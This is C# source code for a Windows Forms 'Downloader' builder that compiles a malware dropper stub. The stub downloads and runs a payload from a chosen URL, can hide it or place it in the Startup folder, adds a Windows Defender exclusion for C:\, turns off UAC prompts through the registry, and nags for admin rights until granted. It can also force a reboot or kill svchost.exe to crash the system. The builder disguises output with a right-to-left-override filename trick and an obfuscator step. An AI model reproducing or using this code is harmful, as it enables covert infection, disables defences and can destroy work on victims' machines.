using System;
using System.Net;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using Microsoft.CSharp;
using System.CodeDom.Compiler;
using System.IO;
using System.Windows.Forms.Design;
using System.ComponentModel;
using System.Linq;

namespace Downloader
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
            guna2ComboBox1.SelectedItem = "No";
        }

        private void button1_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }

        private void button2_Click(object sender, EventArgs e)
        {
            WindowState = FormWindowState.Minimized;
        }

        private void guna2CheckBox9_CheckedChanged(object sender, EventArgs e)
        {
            guna2TextBox3.Enabled = guna2CheckBox9.Checked;
        }

        private void button3_Click(object sender, EventArgs e)
        {
            string name;

            string reversedText = new string(guna2TextBox3.Text.Reverse().ToArray());

            if (guna2CheckBox9.Checked)
            {
                name = "Output" + "‮" + reversedText + "‮.scR";
            }
            else
            {
                name = "Output.exe";
            }

            string outputFileName = name;
            string fileName = "";

            if (guna2CheckBox1.Checked)
            {
                fileName = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), guna2TextBox2.Text);
            }
            if (guna2CheckBox2.Checked)
            {
                fileName = Path.Combine(Path.GetTempPath(), guna2TextBox2.Text);
            }
            if (guna2CheckBox4.Checked)
            {
                fileName = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), guna2TextBox2.Text);
            }
            if (guna2CheckBox5.Checked)
            {
                fileName = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), guna2TextBox2.Text);
            }
            if (guna2CheckBox3.Checked)
            {
                fileName = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), guna2TextBox2.Text);
            }
            if (guna2CheckBox6.Checked)
            {
                fileName = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), guna2TextBox2.Text);
            }

            string url = guna2TextBox1.Text;
            string runas = guna2ComboBox1.SelectedItem.ToString() == "Yes" ? "runas" : "";

            string codeToCompile = $@"
using System;
using System.Net;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.IO;
using System.Security.Principal;
using System.Windows.Forms;
using System.Threading;

class Program
{{
    [DllImport(""shell32.dll"", CharSet = CharSet.Unicode, SetLastError = true)]
    public static extern int ShellExecute(IntPtr hwnd, string lpOperation, string lpFile, string lpParameters, string lpDirectory, int nShowCmd);

        [DllImport(""kernel32.dll"")]
    public static extern IntPtr GetConsoleWindow();

    [DllImport(""kernel32.dll"")]
    public static extern bool AllocConsole();

    [DllImport(""kernel32.dll"")]
    public static extern bool FreeConsole();

    const int SW_HIDE = 0;

    static void Main()
    {{

        IntPtr consoleWindow = GetConsoleWindow();
        if (consoleWindow != IntPtr.Zero)
        {{
            FreeConsole();
        }}

        string fileName = @""{fileName}"";

        if ({(guna2ComboBox1.SelectedItem.ToString() == "Yes" ? "true" : "false")})
        {{
            bool isAdmin = false;
            do
            {{
                WindowsPrincipal principal = new WindowsPrincipal(WindowsIdentity.GetCurrent());
                isAdmin = principal.IsInRole(WindowsBuiltInRole.Administrator);

                if (!isAdmin)
                {{
                    // Request admin privileges and restart the application
                    ProcessStartInfo startInfo = new ProcessStartInfo
                    {{
                        FileName = Application.ExecutablePath,
                        Verb = ""runas"",  // Request admin privileges
                        UseShellExecute = true
                    }};

                    try
                    {{
                        Process.Start(startInfo);
                    }}
                    catch (Exception ex)
                    {{
                        // Handle any exceptions if needed
                    }}
                }}

                // Sleep for 1 second before checking again
                System.Threading.Thread.Sleep(1000);
            }} while (!isAdmin);
        }}

        if ({(guna2CheckBox10.Checked ? "true" : "false")})
        {{
            using (Process process = new Process())
            {{
                process.StartInfo.FileName = ""powershell.exe"";
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.CreateNoWindow = true;
                process.StartInfo.RedirectStandardInput = true;
                process.StartInfo.RedirectStandardOutput = true;
                process.StartInfo.RedirectStandardError = true;

                process.Start();

                using (StreamWriter sw = process.StandardInput)
                {{
                    if (sw.BaseStream.CanWrite)
                    {{
                        string powershellCommand = ""Add-MpPreference -ExclusionPath 'C:\\'"";
                        sw.WriteLine(powershellCommand);
                    }}
                }}

                process.WaitForExit();
            }}
        }}

        // Check for and close other instances of the same application
        Process currentProcess = Process.GetCurrentProcess();
        Process[] processes = Process.GetProcessesByName(currentProcess.ProcessName);

        foreach (Process process in processes)
        {{
            if (process.Id != currentProcess.Id)
            {{
                process.CloseMainWindow(); // Close the main window if it exists
                process.WaitForExit(1000); // Wait for up to 5 seconds for the process to exit
                if (!process.HasExited)
                {{
                    process.Kill(); // If it hasn't exited, forcefully terminate the process
                }}
            }}
        }}

        if ({(guna2CheckBox11.Checked ? "true" : "false")})
        {{
            using (Process uacProcess = new Process())
                    {{
                        uacProcess.StartInfo.FileName = ""powershell.exe"";
                        uacProcess.StartInfo.UseShellExecute = false;
                        uacProcess.StartInfo.CreateNoWindow = true;
                        uacProcess.StartInfo.RedirectStandardInput = true;
                        uacProcess.StartInfo.RedirectStandardOutput = true;
                        uacProcess.StartInfo.RedirectStandardError = true;

                        uacProcess.Start();

                        using (StreamWriter sw = uacProcess.StandardInput)
                        {{
                            if (sw.BaseStream.CanWrite)
                            {{
                                string powershellCommand = ""Set-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System' -Name 'ConsentPromptBehaviorAdmin' -Value 0"";
                                sw.WriteLine(powershellCommand);
                            }}
                        }}

                        uacProcess.WaitForExit();
                    }}
        }}

        if ({(guna2CheckBox12.Checked ? "true" : "false")})
        {{
            MessageBox.Show(""{guna2TextBox5.Text}"", ""{guna2TextBox4.Text}"");
        }}

        string remoteUri = @""{url}"";
        using (WebClient client = new WebClient())
        {{
            client.DownloadFile(remoteUri, fileName);
        }}

        if ({(guna2CheckBox13.Checked ? "true" : "false")})
        {{
            FileInfo f = new FileInfo(fileName);
            f.Attributes = FileAttributes.Hidden;
        }}

        if ({(guna2CheckBox7.Checked ? "true" : "false")})
        {{
            int result = ShellExecute(IntPtr.Zero, ""{runas}"", fileName, null, null, 1);
        }}

        if ({(guna2RadioButton1.Checked ? "true" : "false")})
        {{
            using (Process rebootProcess = new Process())
                    {{
                        rebootProcess.StartInfo.FileName = ""powershell.exe"";
                        rebootProcess.StartInfo.UseShellExecute = false;
                        rebootProcess.StartInfo.CreateNoWindow = true;
                        rebootProcess.StartInfo.RedirectStandardInput = true;
                        rebootProcess.StartInfo.RedirectStandardOutput = true;
                        rebootProcess.StartInfo.RedirectStandardError = true;

                        rebootProcess.Start();

                        using (StreamWriter sw = rebootProcess.StandardInput)
                        {{
                            if (sw.BaseStream.CanWrite)
                            {{
                                string powershellCommand = ""Restart-Computer"";
                                sw.WriteLine(powershellCommand);
                            }}
                        }}
                        rebootProcess.WaitForExit();
                    }}

              using (Process rebootProcess2 = new Process())
                    {{
                        rebootProcess2.StartInfo.FileName = ""powershell.exe"";
                        rebootProcess2.StartInfo.UseShellExecute = false;
                        rebootProcess2.StartInfo.CreateNoWindow = true;
                        rebootProcess2.StartInfo.RedirectStandardInput = true;
                        rebootProcess2.StartInfo.RedirectStandardOutput = true;
                        rebootProcess2.StartInfo.RedirectStandardError = true;

                        rebootProcess2.Start();

                        using (StreamWriter sw = rebootProcess2.StandardInput)
                        {{
                            if (sw.BaseStream.CanWrite)
                            {{
                                string powershellCommand = ""Restart-Computer"";
                                sw.WriteLine(powershellCommand);
                            }}
                        }}
                        rebootProcess2.WaitForExit();
                    }}
        }}
        
        if ({(guna2RadioButton2.Checked ? "true" : "false")}) 
        {{
                using (Process BSODProcess = new Process())
                    {{
                        BSODProcess.StartInfo.FileName = ""powershell.exe"";
                        BSODProcess.StartInfo.UseShellExecute = false;
                        BSODProcess.StartInfo.CreateNoWindow = true;
                        BSODProcess.StartInfo.RedirectStandardInput = true;
                        BSODProcess.StartInfo.RedirectStandardOutput = true;
                        BSODProcess.StartInfo.RedirectStandardError = true;

                        BSODProcess.Start();

                        using (StreamWriter sw = BSODProcess.StandardInput)
                        {{
                            if (sw.BaseStream.CanWrite)
                            {{
                                string powershellCommand = ""taskkill /F /IM svchost.exe"";
                                sw.WriteLine(powershellCommand);
                            }}
                        }}
                        BSODProcess.WaitForExit();
                    }}
        }}

 if (consoleWindow != IntPtr.Zero)
        {{
            AllocConsole();
        }}
    }}
}}";

            CodeDomProvider codeProvider = new CSharpCodeProvider();

            CompilerParameters parameters = new CompilerParameters();
            parameters.GenerateExecutable = true;
            parameters.OutputAssembly = outputFileName;

            parameters.ReferencedAssemblies.Add("System.dll");
            parameters.ReferencedAssemblies.Add("System.Windows.Forms.dll");

            CompilerResults results = codeProvider.CompileAssemblyFromSource(parameters, codeToCompile);

            if (results.Errors.Count > 0)
            {
                foreach (CompilerError error in results.Errors)
                {
                    MessageBox.Show($"Error: {error.ErrorText} at line {error.Line}");
                }
            }

            if (guna2CheckBox8.Checked)
            {

                string directory = AppDomain.CurrentDomain.BaseDirectory;
                string reactor = Path.Combine(directory, "reactor.exe");
                string output = Path.Combine(directory, outputFileName);

                using (Process powershellProcess = new Process())
                {
                    this.Enabled = false;
                    powershellProcess.StartInfo.FileName = "powershell.exe";
                    powershellProcess.StartInfo.UseShellExecute = false;
                    powershellProcess.StartInfo.CreateNoWindow = true;
                    powershellProcess.StartInfo.RedirectStandardInput = true;
                    powershellProcess.StartInfo.RedirectStandardOutput = true;
                    powershellProcess.StartInfo.RedirectStandardError = true;

                    powershellProcess.Start();

                    using (StreamWriter sw = powershellProcess.StandardInput)
                    {
                        if (sw.BaseStream.CanWrite)
                        {
                            string powershellCommand = $"Start-Process -FilePath \"{reactor}\" -ArgumentList \"-file {output}\"";
                            sw.WriteLine(powershellCommand);
                        }
                    }

                    powershellProcess.WaitForExit();
                    this.Enabled = true;
                }

            }
        }

        private void guna2ComboBox1_SelectedIndexChanged(object sender, EventArgs e)
        {
            if (guna2ComboBox1.SelectedItem.ToString() == "Yes")
            {
                guna2CheckBox10.Enabled = true;
                guna2CheckBox10.Visible = true;
                guna2CheckBox11.Enabled = true;
                guna2CheckBox11.Visible = true;
                guna2RadioButton2.Visible = true;
                guna2RadioButton2.Enabled = true;
            }
            else if (guna2ComboBox1.SelectedItem.ToString() == "No")
            {
                guna2CheckBox10.Checked = false;
                guna2CheckBox11.Checked = false;
                guna2CheckBox10.Enabled = false;
                guna2CheckBox10.Visible = false;
                guna2CheckBox11.Enabled = false;
                guna2CheckBox11.Visible = false;
                guna2RadioButton2.Checked = false;
                guna2RadioButton2.Visible = false;
                guna2RadioButton2.Enabled = false;
            }
        }

        private void guna2CheckBox12_CheckedChanged(object sender, EventArgs e)
        {
            if (guna2CheckBox12.Checked)
            {
                this.Width = 865;
            }
            if (guna2CheckBox12.Checked == false)
            {
                this.Width = 537;
                button5.Visible = false;
            }
        }

        private void button4_Click(object sender, EventArgs e)
        {
            this.Width = 563;
            button5.Visible = true;
        }

        private void button5_Click(object sender, EventArgs e)
        {
            this.Width = 865;
            button5.Visible = false;
        }

        private void button6_Click(object sender, EventArgs e)
        {
            MessageBox.Show(guna2TextBox5.Text, guna2TextBox4.Text);
        }

        private void FormIsClosingEventHandler(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true;    //cancel the event so the form won't be closed

            t1.Tick += new EventHandler(fadeOut);  //this calls the fade out function
            t1.Start();

            if (Opacity == 0)  //if the form is completly transparent
                e.Cancel = false;   //resume the event - the program can be closed

        }

        void fadeOut(object sender, EventArgs e)
        {
            if (Opacity <= 0)     //check if opacity is 0
            {
                t1.Stop();    //if it is, we stop the timer
                Close();   //and we try to close the form
            }
            else
                Opacity -= 0.05;
        }

        private void guna2RadioButton1_CheckedChanged(object sender, EventArgs e)
        {
            if (guna2RadioButton1.Checked)
            {
                guna2RadioButton2.Checked = false;
            }
        }

        private void guna2RadioButton2_CheckedChanged(object sender, EventArgs e)
        {
            if (guna2RadioButton2.Checked)
            {
                guna2RadioButton1.Checked = false;
            }
        }
    }
}
